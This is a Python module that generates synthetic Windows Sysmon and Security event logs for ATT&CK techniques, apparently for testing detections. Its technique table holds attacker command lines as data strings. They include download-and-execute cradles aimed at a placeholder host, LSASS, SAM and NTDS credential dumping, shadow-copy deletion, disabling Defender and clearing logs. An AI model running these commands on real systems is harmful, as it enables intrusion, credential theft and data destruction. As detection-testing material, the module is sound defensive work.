import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

SYSMON = ("Microsoft-Windows-Sysmon", "Microsoft-Windows-Sysmon/Operational")
SECURITY = ("Microsoft-Windows-Security-Auditing", "Security")
SYSTEM = ("Service Control Manager", "System")
POWERSHELL = ("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational")

W = "C:\\Windows\\System32\\"
PS = W + "WindowsPowerShell\\v1.0\\powershell.exe"
CMD = W + "cmd.exe"
LSASS = W + "lsass.exe"

T: Dict[str, Dict[str, Any]] = {
    "T1059.001": {"name": "PowerShell encoded command", "steps": [("proc", PS, "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
                                                                ("ps", "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')")]},
    "T1059.003": {"name": "Windows command shell", "steps": [("proc", CMD, "cmd.exe /c \"echo %USERNAME% > C:\\Users\\Public\\u.txt & type C:\\Users\\Public\\u.txt\"")]},
    "T1059.005": {"name": "VBScript with wscript", "steps": [("proc", W + "wscript.exe", "wscript.exe //B C:\\Users\\Public\\Documents\\invoice.vbs")]},
    "T1047": {"name": "WMI process create", "steps": [("proc", W + "wbem\\WMIC.exe", "wmic process call create \"powershell -nop -c whoami\"")]},
    "T1053.005": {"name": "Scheduled task", "steps": [("proc", W + "schtasks.exe", "schtasks /create /sc minute /mo 15 /tn \"WinUpdateCheck\" /tr \"C:\\Users\\Public\\upd.exe\" /f"),
                                                      ("sec", 4698, {"TaskName": "\\WinUpdateCheck", "TaskContent": "<Exec><Command>C:\\Users\\Public\\upd.exe</Command></Exec>"})]},
    "T1543.003": {"name": "New Windows service", "steps": [("proc", W + "sc.exe", "sc.exe create UpdSvc binPath= \"C:\\ProgramData\\updsvc.exe\" start= auto"),
                                                           ("svc", {"ServiceName": "UpdSvc", "ImagePath": "C:\\ProgramData\\updsvc.exe", "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"})]},
    "T1547.001": {"name": "Run key persistence", "steps": [("proc", W + "reg.exe", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d C:\\Users\\Public\\sync.exe /f"),
                                                           ("reg", "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync", "C:\\Users\\Public\\sync.exe")]},
    "T1218.011": {"name": "Rundll32 runs a DLL", "steps": [("proc", W + "rundll32.exe", "rundll32.exe C:\\Users\\Public\\update.dll,Start"), ("net", W + "rundll32.exe", "198.51.100.7", 443)]},
    "T1218.005": {"name": "Mshta runs remote HTA", "steps": [("proc", W + "mshta.exe", "mshta.exe http://198.51.100.7/run.hta")]},
    "T1218.010": {"name": "Regsvr32 Squiblydoo", "steps": [("proc", W + "regsvr32.exe", "regsvr32.exe /s /n /u /i:http://198.51.100.7/file.sct scrobj.dll")]},
    "T1218.007": {"name": "Msiexec remote package", "steps": [("proc", W + "msiexec.exe", "msiexec.exe /q /i http://198.51.100.7/pkg.msi")]},
    "T1127.001": {"name": "MSBuild runs inline task", "steps": [("proc", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", "MSBuild.exe C:\\Users\\Public\\build.xml")]},
    "T1105": {"name": "Certutil download", "steps": [("proc", W + "certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.7/payload.bin C:\\Users\\Public\\payload.dll"),
                                                     ("net", W + "certutil.exe", "198.51.100.7", 80), ("file", W + "certutil.exe", "C:\\Users\\Public\\payload.dll")]},
    "T1197": {"name": "BITS job download", "steps": [("proc", W + "bitsadmin.exe", "bitsadmin /transfer job1 /download /priority high http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe")]},
    "T1140": {"name": "Certutil decode", "steps": [("proc", W + "certutil.exe", "certutil -decode C:\\Users\\Public\\enc.txt C:\\Users\\Public\\tool.exe")]},
    "T1003.001": {"name": "LSASS memory dump", "steps": [("proc", "C:\\Users\\Public\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"),
                                                         ("access", "C:\\Users\\Public\\procdump64.exe", LSASS, "0x1fffff"),
                                                         ("proc", W + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Users\\Public\\out.dmp full"),
                                                         ("access", W + "rundll32.exe", LSASS, "0x1410")]},
    "T1003.002": {"name": "SAM hive copy", "steps": [("proc", W + "reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam.save"), ("proc", W + "reg.exe", "reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save")]},
    "T1003.003": {"name": "NTDS copy with ntdsutil", "steps": [("proc", W + "ntdsutil.exe", "ntdsutil.exe \"ac i ntds\" ifm \"create full C:\\ProgramData\\ntds\" q q")]},
    "T1003.006": {"name": "DCSync", "steps": [("sec", 4662, {"SubjectUserName": "dana", "SubjectDomainName": "CORP", "ObjectServer": "DS", "AccessMask": "0x100",
                                                             "Properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}"})]},
    "T1552.001": {"name": "Search files for passwords", "steps": [("proc", W + "findstr.exe", "findstr /si password *.xml *.ini *.txt *.config")]},
    "T1033": {"name": "Whoami", "steps": [("proc", W + "whoami.exe", "whoami /all")]},
    "T1082": {"name": "System information", "steps": [("proc", W + "systeminfo.exe", "systeminfo")]},
    "T1087.002": {"name": "Domain account discovery", "steps": [("proc", W + "net.exe", "net group \"domain admins\" /domain"), ("proc", W + "net1.exe", "net1 group \"domain admins\" /domain")]},
    "T1069.001": {"name": "Local group discovery", "steps": [("proc", W + "net.exe", "net localgroup administrators")]},
    "T1018": {"name": "Domain controller discovery", "steps": [("proc", W + "nltest.exe", "nltest /dclist:corp.local")]},
    "T1482": {"name": "Domain trust discovery", "steps": [("proc", W + "nltest.exe", "nltest /domain_trusts /all_trusts")]},
    "T1016": {"name": "Network configuration", "steps": [("proc", W + "ipconfig.exe", "ipconfig /all")]},
    "T1049": {"name": "Network connections", "steps": [("proc", W + "NETSTAT.EXE", "netstat -ano")]},
    "T1057": {"name": "Process discovery", "steps": [("proc", W + "tasklist.exe", "tasklist /v")]},
    "T1012": {"name": "Query registry", "steps": [("proc", W + "reg.exe", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")]},
    "T1135": {"name": "Network share discovery", "steps": [("proc", W + "net.exe", "net view \\\\FIN-SRV02 /all")]},
    "T1615": {"name": "Group policy discovery", "steps": [("proc", W + "gpresult.exe", "gpresult /z")]},
    "T1083": {"name": "File discovery", "steps": [("proc", CMD, "cmd.exe /c dir /s /b C:\\Users\\*.kdbx")]},
    "T1490": {"name": "Delete shadow copies", "steps": [("proc", W + "vssadmin.exe", "vssadmin delete shadows /all /quiet"), ("proc", W + "wbadmin.exe", "wbadmin delete catalog -quiet"),
                                                        ("proc", W + "bcdedit.exe", "bcdedit /set {default} recoveryenabled no")]},
    "T1486": {"name": "Ransom note dropped", "steps": [("file", "C:\\Users\\Public\\locker.exe", "C:\\Users\\dana\\Desktop\\README_RESTORE_FILES.txt")]},
    "T1562.001": {"name": "Turn off Defender", "steps": [("proc", PS, "powershell Set-MpPreference -DisableRealtimeMonitoring $true"), ("ps", "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true")]},
    "T1070.001": {"name": "Clear event logs", "steps": [("proc", W + "wevtutil.exe", "wevtutil cl Security"), ("sec", 1102, {"SubjectUserName": "dana", "SubjectDomainName": "CORP"})]},
    "T1070.004": {"name": "Delete tools", "steps": [("proc", CMD, "cmd.exe /c del /f /q C:\\Users\\Public\\procdump64.exe")]},
    "T1112": {"name": "Modify registry", "steps": [("proc", W + "reg.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"),
                                                   ("reg", "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential", "DWORD (0x00000001)")]},
    "T1136.001": {"name": "Local account created", "steps": [("proc", W + "net.exe", "net user helpdesk P@ssw0rd123 /add"), ("sec", 4720, {"TargetUserName": "helpdesk", "TargetDomainName": "FIN-WS07", "SubjectUserName": "dana"})]},
    "T1098": {"name": "Added to administrators", "steps": [("proc", W + "net.exe", "net localgroup administrators helpdesk /add"),
                                                           ("sec", 4732, {"MemberName": "-", "MemberSid": "S-1-5-21-1004-1010", "TargetUserName": "Administrators", "SubjectUserName": "dana"})]},
    "T1110.001": {"name": "Password guessing", "steps": [("fail", "administrator", 25)]},
    "T1110.003": {"name": "Password spraying", "steps": [("spray", ["anna", "bob", "carl", "dina", "eli", "fadi", "gina", "hadi", "iman", "jad", "kim", "lina"])]},
    "T1558.003": {"name": "Kerberoasting", "steps": [("sec", 4769, {"TargetUserName": "dana@CORP.LOCAL", "ServiceName": "MSSQLSvc", "TicketEncryptionType": "0x17", "TicketOptions": "0x40810000", "IpAddress": "::ffff:10.20.4.57", "Status": "0x0"})]},
    "T1550.002": {"name": "Pass the hash", "steps": [("sec", 4624, {"TargetUserName": "administrator", "TargetDomainName": "CORP", "LogonType": 9, "LogonProcessName": "seclogo", "AuthenticationPackageName": "Negotiate", "IpAddress": "::1"})]},
    "T1021.002": {"name": "PsExec over SMB", "steps": [("sec", 5145, {"ShareName": "\\\\*\\ADMIN$", "RelativeTargetName": "PSEXESVC.exe", "IpAddress": "10.20.4.57", "SubjectUserName": "dana", "AccessMask": "0x2"}),
                                                       ("svc", {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem"}),
                                                       ("proc", "C:\\Windows\\PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe"), ("pipe", "C:\\Windows\\PSEXESVC.exe", "\\PSEXESVC")]},
    "T1021.006": {"name": "WinRM remote shell", "steps": [("proc", W + "wsmprovhost.exe", "C:\\Windows\\system32\\wsmprovhost.exe -Embedding"), ("proc", W + "whoami.exe", "whoami", "prev")]},
    "T1569.002": {"name": "Service execution", "steps": [("proc", W + "sc.exe", "sc.exe start UpdSvc")]},
    "T1566.001": {"name": "Office macro starts a shell", "steps": [("proc", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "\"WINWORD.EXE\" /n \"C:\\Users\\dana\\Downloads\\Invoice.docm\""),
                                                                  ("proc", CMD, "cmd.exe /c powershell -nop -w hidden -c iwr http://198.51.100.7/s.ps1|iex", "prev")]},
    "T1055.003": {"name": "Remote thread injection", "steps": [("thread", "C:\\Users\\Public\\inject.exe", W + "notepad.exe")]},
    "T1574.002": {"name": "DLL side loading", "steps": [("proc", "C:\\Users\\Public\\OneDriveUpdater.exe", "C:\\Users\\Public\\OneDriveUpdater.exe"), ("load", "C:\\Users\\Public\\OneDriveUpdater.exe", "C:\\Users\\Public\\version.dll")]},
    "T1546.003": {"name": "WMI event subscription", "steps": [("wmi", "Updater", "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'", "C:\\Users\\Public\\upd.exe")]},
    "T1071.004": {"name": "DNS tunneling", "steps": [("dns", W + "nslookup.exe", "aGVsbG8gZnJvbSBzaWdtYSBmb3JnZSB0dW5uZWw.data.exfil-tunnel.example")]},
    "T1560.001": {"name": "Archive with password", "steps": [("proc", "C:\\Program Files\\WinRAR\\rar.exe", "rar.exe a -hpS3cret -r C:\\Users\\Public\\out.rar C:\\Users\\dana\\Documents\\*.xlsx")]},
    "T1124": {"name": "System time discovery", "steps": [("proc", W + "net.exe", "net time \\\\FIN-DC01")]},
}


class _Builder:
    def __init__(self, host: str, user: str, start: datetime):
        self.host, self.user, self.t, self.rid = host, user, start, 9000
        self.parent = {"guid": "{" + str(uuid.uuid4()) + "}", "pid": 2100, "image": "C:\\Windows\\explorer.exe", "cmd": "C:\\Windows\\Explorer.EXE"}
        self.prev = None
        self.events: List[Dict[str, Any]] = []

    def tick(self, s: float = 3):
        self.t += timedelta(seconds=s)

    def ev(self, src, eid: int, data: Dict[str, Any], tech: str):
        self.rid += 1
        system = {"Provider": {"#attributes": {"Name": src[0]}}, "EventID": eid, "TimeCreated": {"#attributes": {"SystemTime": self.t.strftime("%Y-%m-%dT%H:%M:%S.%fZ")}},
                  "EventRecordID": self.rid, "Channel": src[1], "Computer": self.host}
        payload = dict(data)
        if src is SYSMON:
            payload = {"RuleName": f"technique_id={tech}", "UtcTime": self.t.strftime("%Y-%m-%d %H:%M:%S.") + f"{self.t.microsecond // 1000:03d}", **payload}
        self.events.append({"Event": {"System": system, "EventData": payload}})

    def proc(self, image, cmd, tech, parent=None):
        p = self.prev if parent == "prev" and self.prev else self.parent
        pid = random.randint(3000, 9000)
        guid = "{" + str(uuid.uuid4()) + "}"
        name = image.split("\\")[-1]
        self.ev(SYSMON, 1, {"ProcessGuid": guid, "ProcessId": pid, "Image": image, "FileVersion": "10.0.19041.1", "Description": name, "Product": "Microsoft Windows Operating System",
                            "Company": "Microsoft Corporation", "OriginalFileName": name, "CommandLine": cmd, "CurrentDirectory": "C:\\Users\\dana\\", "User": self.user,
                            "LogonId": "0x3e7a1", "IntegrityLevel": "High", "Hashes": "SHA256=" + uuid.uuid5(uuid.NAMESPACE_DNS, image).hex * 2,
                            "ParentProcessGuid": p["guid"], "ParentProcessId": p["pid"], "ParentImage": p["image"], "ParentCommandLine": p["cmd"], "ParentUser": self.user}, tech)
        dom, usr = (self.user.split("\\") + [""])[:2]
        self.ev(SECURITY, 4688, {"SubjectUserName": usr, "SubjectDomainName": dom, "SubjectLogonId": "0x3e7a1", "NewProcessId": hex(pid), "NewProcessName": image,
                                 "TokenElevationType": "%%1937", "ProcessId": hex(p["pid"]), "CommandLine": cmd, "TargetUserName": "-", "ParentProcessName": p["image"],
                                 "MandatoryLabel": "S-1-16-12288"}, tech)
        self.prev = {"guid": guid, "pid": pid, "image": image, "cmd": cmd}

    def step(self, s, tech):
        kind = s[0]
        self.tick(random.uniform(2, 9))
        if kind == "proc":
            self.proc(s[1], s[2], tech, s[3] if len(s) > 3 else None)
        elif kind == "net":
            self.ev(SYSMON, 3, {"ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"], "Image": s[1], "User": self.user, "Protocol": "tcp",
                                "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "10.20.4.57", "SourcePort": random.randint(49152, 65000),
                                "DestinationIsIpv6": "false", "DestinationIp": s[2], "DestinationPort": s[3]}, tech)
        elif kind == "reg":
            self.ev(SYSMON, 13, {"EventType": "SetValue", "ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"],
                                 "Image": (self.prev or self.parent)["image"], "TargetObject": s[1], "Details": s[2], "User": self.user}, tech)
        elif kind == "file":
            self.ev(SYSMON, 11, {"ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"], "Image": s[1], "TargetFilename": s[2],
                                 "CreationUtcTime": self.t.strftime("%Y-%m-%d %H:%M:%S.000"), "User": self.user}, tech)
        elif kind == "access":
            self.ev(SYSMON, 10, {"SourceProcessGUID": (self.prev or self.parent)["guid"], "SourceProcessId": (self.prev or self.parent)["pid"], "SourceThreadId": 4410, "SourceImage": s[1],
                                 "TargetProcessGUID": "{00000000-0000-0000-0000-000000000640}", "TargetProcessId": 640, "TargetImage": s[2], "GrantedAccess": s[3],
                                 "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|UNKNOWN(00007FF8A1B2C3D4)",
                                 "SourceUser": self.user, "TargetUser": "NT AUTHORITY\\SYSTEM"}, tech)
        elif kind == "thread":
            self.ev(SYSMON, 8, {"SourceProcessGuid": self.parent["guid"], "SourceProcessId": 6120, "SourceImage": s[1], "TargetProcessGuid": "{" + str(uuid.uuid4()) + "}",
                                "TargetProcessId": 7744, "TargetImage": s[2], "NewThreadId": 8120, "StartAddress": "0x000001A2B3C40000", "StartModule": "-", "StartFunction": "-",
                                "SourceUser": self.user, "TargetUser": self.user}, tech)
        elif kind == "load":
            self.ev(SYSMON, 7, {"ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"], "Image": s[1], "ImageLoaded": s[2],
                                "FileVersion": "-", "Description": "-", "Product": "-", "Company": "-", "OriginalFileName": "-", "Hashes": "SHA256=" + uuid.uuid4().hex * 2,
                                "Signed": "false", "Signature": "-", "SignatureStatus": "Unavailable", "User": self.user}, tech)
        elif kind == "pipe":
            self.ev(SYSMON, 17, {"EventType": "CreatePipe", "ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"], "PipeName": s[2], "Image": s[1], "User": "NT AUTHORITY\\SYSTEM"}, tech)
        elif kind == "dns":
            self.ev(SYSMON, 22, {"ProcessGuid": (self.prev or self.parent)["guid"], "ProcessId": (self.prev or self.parent)["pid"], "QueryName": s[2], "QueryStatus": "0",
                                 "QueryResults": "type:  5 tunnel.example;", "Image": s[1], "User": self.user}, tech)
        elif kind == "wmi":
            self.ev(SYSMON, 19, {"EventType": "WmiFilterEvent", "Operation": "Created", "User": self.user, "EventNamespace": "\"root\\\\subscription\"", "Name": f"\"{s[1]}\"", "Query": f"\"{s[2]}\""}, tech)
            self.tick(1)
            self.ev(SYSMON, 20, {"EventType": "WmiConsumerEvent", "Operation": "Created", "User": self.user, "Name": f"\"{s[1]}\"", "Type": "Command Line", "Destination": f"\"{s[3]}\""}, tech)
            self.tick(1)
            self.ev(SYSMON, 21, {"EventType": "WmiBindingEvent", "Operation": "Created", "User": self.user, "Consumer": f"\"CommandLineEventConsumer.Name=\\\"{s[1]}\\\"\"",
                                 "Filter": f"\"__EventFilter.Name=\\\"{s[1]}\\\"\""}, tech)
        elif kind == "ps":
            self.ev(POWERSHELL, 4104, {"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": s[1], "ScriptBlockId": str(uuid.uuid4()), "Path": ""}, tech)
        elif kind == "sec":
            self.ev(SECURITY, s[1], s[2], tech)
        elif kind == "svc":
            self.ev(SYSTEM, 7045, s[1], tech)
        elif kind == "fail":
            for _ in range(s[2]):
                self.tick(random.uniform(0.5, 2))
                self.ev(SECURITY, 4625, {"TargetUserName": s[1], "TargetDomainName": "CORP", "Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313",
                                         "LogonType": 3, "LogonProcessName": "NtLmSsp", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.50", "IpPort": "0"}, tech)
        elif kind == "spray":
            for u in s[1]:
                self.tick(random.uniform(0.5, 2))
                self.ev(SECURITY, 4625, {"TargetUserName": u, "TargetDomainName": "CORP", "Status": "0xc000006d", "SubStatus": "0xc000006a", "FailureReason": "%%2313",
                                         "LogonType": 3, "LogonProcessName": "NtLmSsp", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.50", "IpPort": "0"}, tech)


def catalog() -> List[Dict[str, Any]]:
    from app.core.attack import load_attack

    known = load_attack().get("techniques", {})
    out = []
    for tid, spec in T.items():
        info = known.get(tid, {})
        out.append({"id": tid, "name": info.get("name") or spec["name"], "what": spec["name"], "tactics": info.get("tactics", []), "events": len(spec["steps"])})
    return out


def generate(techniques: Optional[List[str]] = None, host: str = "FIN-WS07", user: str = "CORP\\dana", seed: int = 7, start: Optional[datetime] = None) -> Dict[str, Any]:
    random.seed(seed)
    picked = []
    for t in techniques or list(T):
        tid = str(t).strip().upper()
        if tid in T and tid not in picked:
            picked.append(tid)
        elif tid not in picked:
            subs = [k for k in T if k.startswith(tid + ".")]
            picked.extend(s for s in subs if s not in picked)
    b = _Builder(host[:60] or "FIN-WS07", user[:80] or "CORP\\dana", start or datetime.now(timezone.utc).replace(microsecond=0) - timedelta(hours=1))
    for tid in picked:
        for step in T[tid]["steps"]:
            b.step(step, tid)
        b.tick(30)
    missing = [str(t).upper() for t in (techniques or []) if not any(p == str(t).upper() or p.startswith(str(t).upper() + ".") for p in picked)]
    return {"jsonl": "\n".join(json.dumps(e, ensure_ascii=False) for e in b.events) + ("\n" if b.events else ""), "events": len(b.events), "techniques": picked, "missing": missing}
